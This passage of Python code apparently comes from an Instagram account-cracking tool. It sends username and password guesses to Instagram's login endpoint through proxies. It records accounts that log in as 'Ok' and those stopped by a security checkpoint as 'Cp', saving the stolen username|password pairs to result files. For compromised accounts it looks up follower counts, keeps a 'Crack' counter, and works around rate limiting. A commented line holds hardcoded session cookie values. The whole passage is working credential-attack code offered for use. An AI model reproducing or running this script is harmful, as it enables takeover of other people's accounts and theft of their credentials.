                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
                        #coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            ___roz = requests.get(f'https://z-p42.www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{A}║ [{H}✔{A}]{A} Status {A}:{H} SUCCESS LOGIN")
                        print(f"{A}║ [{H}>{A}]{A} Username {A}:{H} {uid}")
                        print(f"{A}║ [{H}>{A}]{A} Password {A}:{H} {pw}")
                        print(f"{A}║ [{H}>{A}]{A} Follower {A}:{H} {follower}")
                        print(f"{A}║ [{H}>{A}]{A} Following {A}:{H} {following}\n")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://z-p42.www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{A}║ [{M}✘{A}]{A} Status {A}:{J} CHECKPOINT LOGIN")
                        print(f"{A}║ [{J}>{A}]{A} Username {A}:{J} {uid}")
                        print(f"{A}║ [{J}>{A}]{A} Password {A}:{J} {pw}")
                        print(f"{A}║ [{J}>{A}]{A} Follower {A}:{J} {follower}")
                        print(f"{A}║ [{J}>{A}]{A} Following {A}:{J} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print(f"{P}[{M}!{P}]{M} Use Airplane Mode 2 Seconds", end='\r');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{A}╚═➣ [{H}Crack{A}]{H} {self.kill}/{str(len(user))} {J}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{A}╚═➣ [{M}!{A}]{J} connection Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    os.system('git pull')
    ___menu___()
